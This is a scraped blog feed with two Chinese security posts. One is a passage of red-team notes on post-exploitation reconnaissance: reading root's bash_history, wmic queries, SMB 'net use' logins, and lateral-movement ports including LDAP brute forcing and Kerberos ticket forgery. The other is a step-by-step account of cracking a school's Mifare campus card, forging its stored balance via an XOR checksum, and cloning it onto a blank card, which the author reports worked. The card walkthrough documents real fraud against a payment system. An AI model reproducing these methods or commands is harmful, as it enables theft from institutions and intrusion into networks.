awk">cat <span class="hljs-regexp">/root/</span>.bash_history</code></pre><h4 id="查找某个文件（寻找配置文件等）"><a href="#查找某个文件（寻找配置文件等）" class="headerlink" title="查找某个文件（寻找配置文件等）"></a><strong>查找某个文件（寻找配置文件等）</strong></h4><pre><code class="hljs nginx"><span class="hljs-attribute">find</span> / -name <span class="hljs-regexp">*.cfg</span></code></pre><hr><h2 id="10、后渗透信息收集之wmic命令的一些使用方法"><a href="#10、后渗透信息收集之wmic命令的一些使用方法" class="headerlink" title="10、后渗透信息收集之wmic命令的一些使用方法"></a>10、后渗透信息收集之wmic命令的一些使用方法</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>wmic和cmd一样在所有的windows版本中都存在，同时wmic有很多cmd下不方便使用的部分，今天给大家介绍一些在后渗透过程中非常适用的使用wmic进行信息收集的命令</p><h3 id="关于wmic"><a href="#关于wmic" class="headerlink" title="关于wmic"></a><strong>关于wmic</strong></h3><p>WMI命令行（WMIC）实用程序为WMI提供了命令行界面。WMIC与现有的Shell和实用程序命令兼容。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的，WMIC改变了这种情况</p><h3 id="wmic的简单使用"><a href="#wmic的简单使用" class="headerlink" title="wmic的简单使用"></a>wmic的简单使用</h3><p>首先在cmd命令行输入<code>wmic</code>进入交互式页面，这里说一下在powershell也可以和cmd命令行一样的操作<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/25.png" alt="wmic的简单使用"></p><pre><code class="hljs arduino">/?查看WMIC命令的全局选项以及命令属性等<span class="hljs-built_in">process</span> /?进程管理的帮助wmic <span class="hljs-built_in">process</span> <span class="hljs-built_in">get</span> /?   属性获取操作帮助</code></pre><p>根据实际的需要去对相关的信息进行读取</p><h3 id="以进程为例展现wmic的使用"><a href="#以进程为例展现wmic的使用" class="headerlink" title="以进程为例展现wmic的使用"></a>以进程为例展现wmic的使用</h3><p>这里的靶机是<code>server 2008</code>的虚拟机，这里以查看进程为例：</p><h4 id="获取系统当前正在运行的进程等信息"><a href="#获取系统当前正在运行的进程等信息" class="headerlink" title="获取系统当前正在运行的进程等信息"></a>获取系统当前正在运行的进程等信息</h4><pre><code class="hljs arduino">wmic <span class="hljs-built_in">process</span> <span class="hljs-built_in">get</span> caption,executablepath,processid</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/26.png" alt="获取进程信息"></p><h4 id="查看服务进程详细信息"><a href="#查看服务进程详细信息" class="headerlink" title="查看服务进程详细信息"></a>查看服务进程详细信息</h4><pre><code class="hljs pf">wmic service where (<span class="hljs-keyword">state</span>=<span class="hljs-string">&quot;running&quot;</span>) get name ,processid ,pathname ,startmode ,caption</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/27.png" alt="获取进程详细信息"></p><h4 id="系统安装软件情况"><a href="#系统安装软件情况" class="headerlink" title="系统安装软件情况"></a>系统安装软件情况</h4><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20.png" alt="查看当前安装的程序"></p><h4 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h4><pre><code class="hljs routeros">wmic environment <span class="hljs-builtin-name">get</span> Description, VariableValue</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/28.png" alt="查看当前安装的程序"></p><p>关于更多的信息可以通过官方的说明文档</p><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic</a></p><h3 id="关于powershell的Get-Wmi对象"><a href="#关于powershell的Get-Wmi对象" class="headerlink" title="关于powershell的Get-Wmi对象"></a>关于powershell的Get-Wmi对象</h3><p><code>Get-Wmi</code>是获取<code>Windows Management Instrumentation（WMI）</code>类的实例或有关可用类的信息。我们需要首先知道自己的 windows计算机支持那些可用的WMI类</p><pre><code class="hljs lsl">Get-Wmiobject -<span class="hljs-type">list</span> 自己的windows计算机支持那些可用的WMI类</code></pre><pre><code class="hljs dsconfig"><span class="hljs-built_in">get-wmiobject</span><span class="hljs-built_in">get-wmiobject</span> -<span class="hljs-string">class </span><span class="hljs-string">win32_process</span>在本地计算机上获取进程</code></pre><p>具体的参数以及命令在官方文档中进行查询：</p><p><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.l#parameters">https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.l#parameters</a></p><h2 id="11、内网横向常见端口"><a href="#11、内网横向常见端口" class="headerlink" title="11、内网横向常见端口"></a>11、内网横向常见端口</h2><h3 id="Port-445"><a href="#Port-445" class="headerlink" title="Port. 445"></a>Port. 445</h3><p>SMB( Server Message Block) Windows协议族，主要功能为文件打印共享服务，简单来讲就是共享文件夹</p><p>该端口也是近年来内网横向扩展中比较火的端口，大名鼎鼎的永恒之蓝漏洞就是利用该端口，操作为扫描其是否存在MS17-010漏洞。正常情况下，其命令主要是建立IPC服务中</p><h4 id="空会话"><a href="#空会话" class="headerlink" title="空会话"></a><strong>空会话</strong></h4><pre><code class="hljs apache"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.x</code></pre><h4 id="远程本地认证"><a href="#远程本地认证" class="headerlink" title="远程本地认证"></a><strong>远程本地认证</strong></h4><pre><code class="hljs sql">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> /<span class="hljs-keyword">user</span>:a\username <span class="hljs-keyword">password</span></code></pre><p>注：a/username 中 a 为工作组情况下的机器命名，可以为任意字符，例如workgroup/username</p><h4 id="域-test-local-远程认证"><a href="#域-test-local-远程认证" class="headerlink" title="域 test.local 远程认证"></a><strong>域 test.local 远程认证</strong></h4><pre><code class="hljs sql">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> /<span class="hljs-keyword">user</span>:<span class="hljs-keyword">test</span>\username <span class="hljs-keyword">password</span></code></pre><h3 id="Port-137、138、139"><a href="#Port-137、138、139" class="headerlink" title="Port:137、138、139"></a>Port:137、138、139</h3><p>NetBios端口，137、138为UDP端口，主要用于内网传输文件，而NetBios/SMB服务的获取主要是通过139端口</p><h3 id="Port-135"><a href="#Port-135" class="headerlink" title="Port: 135"></a><strong>Port: 135</strong></h3><p>该端口主要使用<code>DCOM</code>和<code>RPC（Remote Procedure Call）</code>服务，我们利用这个端口主要做<code>WMI（Windows Management Instrumentation）</code>管理工具的远程操作</p><ul><li>使用时需要开启wmic服务</li><li>几乎所有的命令都是管理员权限</li><li>如果出现 “Invalid Globa| Switch”，需要使用双引号把该加的地方都加上 </li><li>远程系统的本地安全策略的“网络访问：本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li><li>防火墙最好是关闭状态</li></ul><h3 id="Port-53"><a href="#Port-53" class="headerlink" title="Port: 53"></a><strong>Port: 53</strong></h3><p>该端口为DNS服务端口，只要提供域名解析服务使用，该端口在渗透过程中可以寻找一下DNS域传送漏洞，在内网中可以使用DNS协议进行通信传输，隐蔽性更加好<br><strong>参考文章</strong> ：</p><h4 id="dns隧道之dns2tcp"><a href="#dns隧道之dns2tcp" class="headerlink" title="dns隧道之dns2tcp"></a>dns隧道之dns2tcp</h4><ul><li><a href="https://blog.csdn.net/gsls200808/article/details/50318947">https://blog.csdn.net/gsls200808/article/details/50318947</a></li><li><a href="https://blog.csdn.net/deng_xj/article/details/88834124">https://blog.csdn.net/deng_xj/article/details/88834124</a></li></ul><h4 id="dns隧道之unseat2"><a href="#dns隧道之unseat2" class="headerlink" title="dns隧道之unseat2"></a>dns隧道之unseat2</h4><ul><li><a href="https://www.cnblogs.com/bonelee/p/7927706.html">https://www.cnblogs.com/bonelee/p/7927706.html</a></li><li><a href="https://blog.csdn.net/ddr12231/article/details/102306989">https://blog.csdn.net/ddr12231/article/details/102306989</a></li></ul><h3 id="Port-389"><a href="#Port-389" class="headerlink" title="Port: 389"></a><strong>Port: 389</strong></h3><p>用于LADP（轻量级目录访问协议），属于TCP/IP协议，在域过程中一般出现在域控上出现该端口，进行权限认证服务，如果拥有对该域的用户，且担心net或者其他爆破方法不可行的情况，可以尝试使用LADP端口进行爆破</p><p>工具可以使用类似于hydra等开源项目</p><h3 id="Port-88"><a href="#Port-88" class="headerlink" title="Port: 88"></a><strong>Port: 88</strong></h3><p>该端口主要开启Kerberos服务，属于TCP/IP协议，主要任务是监听KDC的票据请求，该协议在渗透过程中可以进行黄金票据和白银票据的伪造，以横向扩展某些服务</p><h3 id="Port-5985"><a href="#Port-5985" class="headerlink" title="Port: 5985"></a><strong>Port: 5985</strong></h3><p>该端口主要介绍WinRM服务，WinRM是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。并且WinRM服务自Windows Vista开始成为Windows的默认组件</p><p>条件:</p><ul><li>Windows Vista上必须手动启动，而Windows Server 2008 中服务是默认开启的 </li><li>服务在后台开启，但是端口还没有开启监听，所以需要开启端口 </li><li>使用 winrm quickconfig 对winRM进行配置，开启HTTP和HTTPSS监听，且需要开启防火墙</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、信息收集&quot;&gt;&lt;a href=&quot;#一、信息收集&quot; class=&quot;headerlink&quot; title=&quot;一、信息收集&quot;&gt;&lt;/a&gt;一、信息收集&lt;/h1&gt;&lt;h2 id=&quot;1、主机发现&quot;&gt;&lt;a href=&quot;#1、主机发现&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    <category term="渗透攻击红队百科全书" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>我是如何破解学校一慧通的</title>
    <link href="http://www.secice.cn/p/c92f138d"/>
    <id>http://www.secice.cn/p/c92f138d</id>
    <published>2020-12-14T08:50:09.000Z</published>
    <updated>2020-12-14T09:54:40.885Z</updated>
    
    <content type="html"><![CDATA[<p>文章是大学的时候写的，现在毕业多年，打算将过程写出来分享下学习思路</p><div class="note note-primary">            <p>本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！</p>          </div><h2 id="一、破解打水功能"><a href="#一、破解打水功能" class="headerlink" title="一、破解打水功能"></a>一、破解打水功能</h2><p>用到的工具：</p><blockquote><p>读卡设备：ACCR122U一个</p></blockquote><blockquote><p>空白M1卡片一张</p></blockquote><blockquote><p>在用的一慧通一张 </p></blockquote><p>上图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/01.png" alt="我是如何破解学校一慧通的"></p><blockquote><p>平台：windows7</p></blockquote><blockquote><p>软件：NFCGUI-Pro.exe</p></blockquote><blockquote><p>M1卡服务程序</p></blockquote><h3 id="具体实施："><a href="#具体实施：" class="headerlink" title="具体实施："></a>具体实施：</h3><p>先去打水那查看卡内的余额：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/02.png" alt="我是如何破解学校一慧通的"></p><p>卡内余额为29.85元，然后将ACR122u插在机器上，使用M1卡服务程序破解得出卡内的DUMP文件</p><p>使用M1卡服务器程序破解：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/03.png" alt="我是如何破解学校一慧通的"></p><p>破解成功</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/04.png" alt="我是如何破解学校一慧通的"></p><p>破解了好久终于破解成功，dump文件会生成在文件目录下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/05.png" alt="我是如何破解学校一慧通的"></p><p><code>dumpfile 09d222aa (2015-11-1210_37_36) 1K.dump</code>文件就是生成的破解文件  可以看到生成的dump文件为1KB大小，但是具体写入M1卡的时候是需要写入4KB大小的dump文件的</p><p>我是可以使用NFCGUI-PRO.exe修复，</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/06.png" alt="我是如何破解学校一慧通的"></p><p>打开这个软件点击选择文件-选择刚才生成的1KB文件-就会提示“是否保存为4K文件格式”—选择“是”-就是自带修复成功</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/07.png" alt="我是如何破解学校一慧通的"></p><p>然后关闭软件，刚才的1kb的DUMP文件就会自带修复为4KB文件了。</p><p>通过上面的方法再得到两个不同金额的dump文件。</p><p>通过十六进制编辑器进行dump文件的对比，找出金额控制位，我使用winhex进行编辑dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/08.png" alt="我是如何破解学校一慧通的"></p><p>因为这三个文件都是同一张卡片不同金额的dump文件，所以假定有金额的数据不同，有刷</p><p>卡次数记录的数据不同，刷卡时间的记录不同，（假定会有这些不同之处，也许只有记录</p><p>金额的变化），通过对比两张卡片，发现在00000901有不同的数据块 </p><p><strong>如图</strong></p><p>余额为29.85：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/09.png" alt="我是如何破解学校一慧通的"></p><p>余额为29.83：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/10.png" alt="我是如何破解学校一慧通的"></p><p>余额为29.33：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/11.png" alt="我是如何破解学校一慧通的"></p><p>发现这两张卡内的不同之处在于：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/12.png" alt="我是如何破解学校一慧通的"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/13.png" alt="我是如何破解学校一慧通的"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/14.png" alt="我是如何破解学校一慧通的"></p><p>将十进制金额转换为十六进制为：</p><pre><code class="hljs basic"><span class="hljs-symbol">2985 </span>= BA9<span class="hljs-symbol">2983 </span>= BA7<span class="hljs-symbol">2933 </span>= B75</code></pre><p>可以看出</p><pre><code class="hljs mipsasm">A9 <span class="hljs-keyword">B</span><span class="hljs-keyword">A7 </span><span class="hljs-keyword">B</span><span class="hljs-keyword">75 </span><span class="hljs-keyword">B</span></code></pre><p>得出结论</p><pre><code class="hljs ini"><span class="hljs-attr">B2</span> = B<span class="hljs-attr">BC</span> = B<span class="hljs-attr">6E</span> = B</code></pre><p>当时想这个B是怎么来的，想了好久，后来发现，将两个不同的数据块进行xor运算：</p><pre><code class="hljs mipsasm">A9 <span class="hljs-keyword">xor </span><span class="hljs-keyword">B2 </span>= <span class="hljs-number">1</span>B<span class="hljs-built_in">A7</span> <span class="hljs-keyword">xor </span><span class="hljs-keyword">BC </span>= <span class="hljs-number">1</span>B<span class="hljs-number">75</span> <span class="hljs-keyword">xor </span><span class="hljs-number">6</span>E = <span class="hljs-number">1</span>B</code></pre><p><strong>xor是如何进行运算的</strong></p><p>例如：</p><pre><code class="hljs dns">A9 xor B2 = <span class="hljs-number">1</span>B将A9转换为二进制为<span class="hljs-number">10101001</span>将B2转换为二进制为<span class="hljs-number">10110010</span><span class="hljs-number">10101001</span><span class="hljs-number">10110010</span>————<span class="hljs-number">00011011</span>然后将<span class="hljs-number">00011011</span>转换成十六进制等于<span class="hljs-number">1</span>B</code></pre><p>我把金额改成40元</p><p>40转换成十六进制为：</p><p>40-4000-FA0</p><p>A0 xor ？= 1F</p><p>将A0转换为二进制为10100000</p><p>将1F转换为二进制为11111</p><p>10100000</p><p>​       ？</p><p>————</p><p>   11111</p><p>可以得出问好区域是10111111</p><p>10111111转换为十六进制为BF</p><p>直接在winhex内修改dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/15.png" alt="我是如何破解学校一慧通的"></p><p>直接保存为40.dump</p><p>通过NFCGUI-PRO.exe软件将dump文件写入到空白卡片中：</p><p><strong>如图:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/16.png" alt="我是如何破解学校一慧通的"></p><p>打开NFCGUI-PRO.exe软件后DUMP和Key文件选择加载文件40.dump</p><p>将ACR122U插入到电脑后将空白卡片放到读卡器上后选择写入文件</p><p>写入成功：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/17.png" alt="我是如何破解学校一慧通的"></p><p>当我拿去测试时，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/18.png" alt="我是如何破解学校一慧通的"></p><p>没错，读不出来……</p><p>然后我的思绪就这样断了…</p><p>我又拿水卡刷了几次后，卡内余额剩余25.90时，终于又发现了….</p><p><strong>如图：</strong></p><p>余额：29.33元</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/19.png" alt="我是如何破解学校一慧通的"></p><p>余额：25.90元</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/20.png" alt="我是如何破解学校一慧通的"></p><p>把金额转换为十六进制</p><pre><code class="hljs apache"><span class="hljs-attribute">29</span>.<span class="hljs-number">33</span>—<span class="hljs-number">2933</span>—B<span class="hljs-number">75</span><span class="hljs-attribute">25</span>.<span class="hljs-number">90</span>—<span class="hljs-number">2590</span>—A<span class="hljs-number">1</span>E</code></pre><p>这样子应该就可以看出了</p><p>40转换成十六进制为：</p><p><code>40-4000-FA0</code></p><p><font color='32CD32'>/*这些上面说过了，怕有些人看不懂我再写一下过程</font></p><p><font color='32CD32'>A0 xor ？= 1F</font></p><p><font color='32CD32'>将A0转换为二进制为10100000</font></p><p><font color='32CD32'>将1F转换为二进制为11111</font></p><p><font color='32CD32'>10100000</font></p><p><font color='32CD32'>       ？</font></p><p><font color='32CD32'>————</font></p><p><font color='32CD32'>   11111</font></p><p><font color='32CD32'>可以得出问好区域是10111111</font></p><p><font color='32CD32'>10111111转换为十六进制为BF</font></p><p><font color='32CD32'>*/</font></p><p>在winhex内修改dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/21.png" alt="我是如何破解学校一慧通的"></p><p>存为40.dump</p><p>写入我就不再继续说了</p><p>我拿卡去测试</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/22.png" alt="我是如何破解学校一慧通的"></p><p>破解成功！！！！</p><blockquote><p>改成999.99太张扬了，而且某些原因，没数据可以分析，所以我加到40就够了！</p></blockquote><h2 id="二、破解洗澡功能"><a href="#二、破解洗澡功能" class="headerlink" title="二、破解洗澡功能"></a>二、破解洗澡功能</h2><p>男寝装备落后，没有插卡机，花了我5块大洋激活洗澡功能。</p><p>经过妹子帮忙多次消费后（可惜那个妹子现在娃都会打酱油了），得出6次数据，4次自己卡中的数据，2次妹子卡中的数据。</p><p>经过对比扇区数据不同后，确定了金额的位置，</p><p>这4次是我自己的数据，如图：</p><p>3.14</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/23.png" alt="我是如何破解学校一慧通的"></p><p>3.20</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/24.png" alt="我是如何破解学校一慧通的"></p><p>4.22</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/25.png" alt="我是如何破解学校一慧通的"></p><p>5.00</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/26.png" alt="我是如何破解学校一慧通的"></p><p>这是妹子卡中的两次数据，如图:</p><p>0.16</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/27.png" alt="我是如何破解学校一慧通的"></p><p>4.78</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/28.png" 